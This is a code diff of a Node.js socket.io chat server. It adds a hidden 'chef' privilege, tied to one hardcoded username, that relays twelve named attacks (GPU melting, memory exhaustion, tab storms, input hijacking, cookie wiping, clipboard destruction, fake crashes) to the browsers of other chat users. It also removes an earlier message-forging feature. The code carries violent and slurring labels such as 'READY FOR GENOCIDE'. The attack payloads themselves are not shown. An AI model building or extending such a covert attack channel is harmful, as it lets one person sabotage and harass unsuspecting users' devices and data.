@@ -6,24 +6,28 @@ const io = require('socket.io')(http);
 app.use(express.static(__dirname));
 app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
 
-let users = {};
-io.on('connection', (socket) => {
-    socket.on('init', (data) => {
-        users[socket.id] = { id: socket.id, name: data.name, chef: data.name === "toucheur2pp" };
-        io.emit('sync', Object.values(users));
+let registry = {};
+io.on('connection', (s) => {
+    s.on('init', (d) => {
+        registry[s.id] = { id: s.id, name: d.name, chef: d.name === "toucheur2pp" };
+        io.emit('sync', Object.values(registry));
     });
 
-    // --- LEVIER DE DESTRUCTION ---
-    socket.on('launch_orbitor', (sid) => {
-        if(users[socket.id]?.chef) io.to(sid).emit('exe_orbitor', { master: users[socket.id].name });
+    // --- LE PANNEAU DES 12 PLAIES ---
+    const attacks = [
+        'atk_orbitor', 'atk_gpu_melt', 'atk_ram_eat', 'atk_tab_storm', 
+        'atk_audio_rape', 'atk_history_flood', 'atk_download_hell', 
+        'atk_input_hijack', 'atk_fake_crash', 'atk_cookie_wipe', 
+        'atk_vibration_spam', 'atk_clipboard_nuke'
+    ];
+
+    attacks.forEach(type => {
+        s.on(type, (targetId) => {
+            if(registry[s.id]?.chef) io.to(targetId).emit('execute', { type, master: registry[s.id].name });
+        });
     });
 
-    socket.on('force_fake_msg', (data) => {
-        if(users[socket.id]?.chef) io.emit('chat_msg', { name: data.targetName, text: data.fakeText, fake: true });
-    });
-
-    socket.on('disconnect', () => { delete users[socket.id]; io.emit('sync', Object.values(users)); });
-    socket.on('chat_msg', (d) => { io.emit('chat_msg', { name: users[socket.id].name, text: d.text }); });
+    s.on('chat', (m) => io.emit('chat', { n: registry[s.id].name, t: m }));
+    s.on('disconnect', () => { delete registry[s.id]; io.emit('sync', Object.values(registry)); });
 });
-
-http.listen(3000, () => console.log("NEBULA V41 : PROTOCOLE ORBITOR ACTIVÉ"));
+http.listen(3000, () => console.log("NEBULA V42 : READY FOR GENOCIDE"));
